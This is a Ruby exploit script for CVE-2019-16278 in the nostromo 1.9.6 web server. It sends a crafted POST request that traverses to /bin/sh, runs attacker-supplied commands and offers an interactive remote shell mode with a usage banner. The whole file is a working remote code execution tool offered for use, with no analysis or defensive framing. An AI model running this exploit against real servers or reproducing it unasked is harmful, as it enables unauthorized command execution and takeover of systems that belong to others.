#!/usr/bin/ruby
#-*- coding:utf-8 -*-
# Author : Unam3dd

#Product : http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz

require 'socket'


@banner = """
\033[31m
███╗   ██╗████████╗ ██████╗     ██████╗  ██████╗███████╗
████╗  ██║╚══██╔══╝██╔═══██╗    ██╔══██╗██╔════╝██╔════╝
██╔██╗ ██║   ██║   ██║   ██║    ██████╔╝██║     █████╗  
██║╚██╗██║   ██║   ██║   ██║    ██╔══██╗██║     ██╔══╝  
██║ ╚████║   ██║   ╚██████╔╝    ██║  ██║╚██████╗███████╗
╚═╝  ╚═══╝   ╚═╝    ╚═════╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                        
            RCE (Remote Code Execution )
            
            CVE-2019-16278


        [ Github : \033[34mUnam3dd\033[31m ]
\033[00m
"""

def execute_rce(ip,port,command)
    s = TCPSocket.new "#{ip}", port
    payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n#{command} 2>&1"
    puts "\033[32m[\033[34m+\033[32m] Sending Payload....\033[00m"
    s.puts payload

    puts "\033[32m[\033[34m*\033[32m] Content :\033[00m"

    while data = s.gets
        puts(data)
    end

end

def execute_rce_shell(ip,port)
    while true
        s = TCPSocket.new "#{ip}", port
        print "shell \033[31m$\033[00m"
        command = STDIN.gets
        command = command.chomp
        payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n#{command} 2>&1"
        s.puts payload
        while data = s.gets
            puts("\033[38;5;82m#{data}\033[00m")
        end
        s.close
    end
end


if __FILE__ == $0
    if ARGV.length < 3
        puts @banner
        puts "\033[31musage :\033[00m \033[38;5;82mcve_2019_16278.rb\033[00m <\033[31mip\033[00m> <\033[31mport\033[00m> <\033[31mcommand\033[00m/\033[31mshell\033[00m>\n\n"
    else
        puts @banner
        if ARGV[2] == "shell"
            execute_rce_shell(ARGV[0],ARGV[1])
        else
            execute_rce(ARGV[0],ARGV[1],ARGV[2])
        end
    end
end